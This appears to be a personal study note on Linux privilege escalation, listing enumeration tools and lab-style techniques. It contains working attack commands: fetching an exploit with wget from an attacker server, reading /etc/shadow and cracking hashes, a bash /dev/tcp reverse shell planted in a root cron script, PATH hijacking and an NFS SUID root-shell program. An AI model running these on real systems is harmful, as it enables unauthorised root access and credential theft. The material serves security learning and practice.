# Linux Privilege Escalation

## 🧰 Popular Linux Enumeration Tools (Explained Simply)

### 1. **LinPEAS**

🔗 [LinPEAS GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- **Most popular, comprehensive tool**
- Written in `bash`
- Scans for **vulnerable configs, weak permissions, passwords in files, cron jobs**, and more
- ✅ Works even without Python or advanced tools installed
- 🌟 Best "all-in-one" auto-scanner

> Use when: You want to scan everything quickly and broadly
> 

---

### 2. **LinEnum**

🔗 [LinEnum GitHub](https://github.com/rebootuser/LinEnum)

- Older but **very reliable Bash script**
- Lists OS info, SUID/SGID binaries, scheduled tasks, network configs, etc.
- Lighter than LinPEAS, but still powerful
- Easy to understand and customize

> Use when: You want a more readable, beginner-friendly scan
> 

---

### 3. **LES (Linux Exploit Suggester)**

🔗 [LES GitHub](https://github.com/mzet-/linux-exploit-suggester)

- Simple script that checks the **kernel version** and tells you what **public exploits** exist for it
- Helps find kernel privilege escalation paths (like dirty cow, dirty pipe, etc.)
- Requires `perl` (sometimes pre-installed)

> Use when: You suspect a vulnerable Linux kernel and want exploit suggestions
> 

---

### 4. **Linux Smart Enumeration (LSE)**

🔗 [LSE GitHub](https://github.com/diego-treitos/linux-smart-enumeration)

- A smart, **modular bash script** with 3 modes:
    - Fast (`q`)
    - Full (`a`)
    - Detailed (`d`)
- Nice balance between LinPEAS and LinEnum
- Good for targeted scans

> Use when: You want more control over the depth of your scan
> 

---

### 5. **Linux Priv Checker**

🔗 [LinuxPrivChecker GitHub](https://github.com/linted/linuxprivchecker)

- Written in Python
- Checks for common privilege escalation paths like:
    - SUID binaries
    - Writable cron jobs
    - Uncommon configurations
- Not as maintained, but still works well

> Use when: Python is installed and you want a fast, light scan
> 

---

## ⚠️ Important Notes

- These tools are **helpers**, not magic. They can miss things.
- Always understand what they find — don’t blindly run exploits.
- Some require permissions (e.g. need `/tmp`, `bash`, `python`, etc.)
- Upload them via `scp`, `wget`, `curl`, or `python -m http.server` if not present

---

## 💡 Pro Tip: Use Multiple Tools

Each tool may find **different weaknesses**, so running **2–3 of them together** gives you better coverage.

# 🔐 Privilege Escalation (P.E.) Techniques

---

## (1) Kernel Exploit-Based Privilege Escalation

This method uses a vulnerability in the Linux kernel.

### 🧭 Steps:

1. **Gain initial access** to the target.
2. **Check kernel version**:
    
    ```bash
    uname -r
    
    ```
    
3. **Search online** for exploits related to that kernel version (e.g., Exploit-DB, GitHub).
4. If you find an exploit script:
    - Download it on your local machine (Kali):
        
        ```bash
        cd ~/Downloads
        python3 -m http.server 8000
        
        ```
        
    - On the target machine, download the exploit:
        
        ```bash
        cd /tmp
        wget http://<Your_Local_IP>:8000/exploit.c
        
        ```
        
5. **Compile the exploit**:
    
    ```bash
    gcc exploit.c -o exploit
    chmod +x exploit
    
    ```
    
6. **Run the exploit**:
    
    ```bash
    ./exploit
    
    ```
    
    You should now have root access.
    

---

## (2) Sudo-Based Privilege Escalation

Leverages misconfigured `sudo` permissions.

### 🧭 Steps:

1. Check your `sudo` rights:
    
    ```bash
    sudo -l
    
    ```
    
2. Look for binaries you can run as root (e.g., `nano`, `less`, `find`, `vim`).
3. Go to [GTFOBins](https://gtfobins.github.io/) and search for the binary.
4. Follow the GTFOBins instructions to gain a root shell.

---

## (3) SUID-Based Privilege Escalation

Targets files with the SUID bit set.

### 🧭 Steps:

1. Find SUID binaries:
    
    ```bash
    find / -type f -perm -04000 -ls 2>/dev/null
    
    ```
    
2. Check the binaries on [GTFOBins](https://gtfobins.github.io/).
3. If a vulnerable binary is found (e.g., `base64`), use it to read sensitive files:
    
    ```bash
    LFILE=/etc/shadow
    /usr/bin/base64 "$LFILE" | base64 --decode
    
    ```
    
4. Save the hash to a file:
    
    ```bash
    nano user2hash.txt
    
    ```
    
5. Crack the hash:
    
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt user2hash.txt
    
    ```
    
6. Switch to the cracked user:
    
    ```bash
    su user2
    
    ```
    
7. Use the same method to decode and read files not accessible directly.

---

## (4) Capabilities-Based Privilege Escalation

Linux capabilities grant binaries specific elevated privileges.

### 🧭 Steps:

1. Find binaries with capabilities:
    
    ```bash
    getcap -r / 2>/dev/null
    
    ```
    
2. Look up the binary on [GTFOBins](https://gtfobins.github.io/).
3. If found, execute it using the example from GTFOBins. For example:
    
    ```bash
    ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
    
    ```
    
    *(Here, `view` is the binary with special capability)*
    

---

## (5) Cron Job-Based Privilege Escalation

Exploits writable scripts run via `cron`.

### 🧭 Steps:

1. Check the crontab:
    
    ```bash
    cat /etc/crontab
    
    ```
    
2. Identify scripts being run as root and check if they are writable:
    
    ```bash
    ls -la /path/to/script.sh
    
    ```
    
3. If writable, modify the script to include a reverse shell:
    
    ```bash
    bash -i >& /dev/tcp/<Local_IP>/<Port> 0>&1
    
    ```
    
4. Start a listener:
    
    ```bash
    nc -lvnp <Port>
    
    ```
    
5. Wait for the cron job to run or execute it manually if needed:
    
    ```bash
    chmod +x /path/to/script.sh
    
    ```
    

---

## (6) `$PATH`Based Privilege Escalation

Targets scripts or binaries that call other binaries without absolute paths.

### 🧭 Steps:

1. Find a script or binary that runs another command **without absolute path**.
2. Check your `PATH`:
    
    ```bash
    echo $PATH
    
    ```
    
3. Prepend a directory you control (like `/tmp`) to your `PATH`:
    
    ```bash
    export PATH=/tmp:$PATH
    
    ```
    
4. Create a fake binary in `/tmp` with the same name as the command being called:
    
    ```bash
    echo "/bin/bash" > /tmp/thm
    chmod +x /tmp/thm
    chmod 777 /tmp/thm
    
    ```
    
5. Run the vulnerable script:
    
    ```bash
    ./test  # Assuming the vulnerable script is named test
    
    ```
    
    You should now have a root shell.
    

---

## (7) NFS-Based Privilege Escalation

Exploits weak NFS (Network File System) exports.

### 🧭 Steps:

### On Attacker Machine (Local):

1. Check NFS exports:
    
    ```bash
    showmount -e <Target_IP>
    
    ```
    

### On Target:

1. Confirm NFS configuration:
    
    ```bash
    cat /etc/exports
    
    ```
    
    - Look for `rw` and `no_root_squash`

### On Local (Attacker):

1. Mount the export:
    
    ```bash
    mkdir /mnt/nfs
    mount -o rw <Target_IP>:/home/ubuntu/sharedfolder /mnt/nfs
    
    ```
    
2. Create a SUID shell:

**`rootshell.c`**

```c
 // rootshell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}

```

1. Compile and set SUID:

```bash
gcc -static rootshell.c -o rootshell
chmod +x rootshell
chmod +s rootshell

```

### Back on Target:

1. Run the binary:

```bash
./sharedfolder/rootshell

```

Now you have root access.

---

[My Actual Notes](Linux%20Privilege%20Escalation/My%20Actual%20Notes%2028308abb572d81758799ee13b2a7f769.md)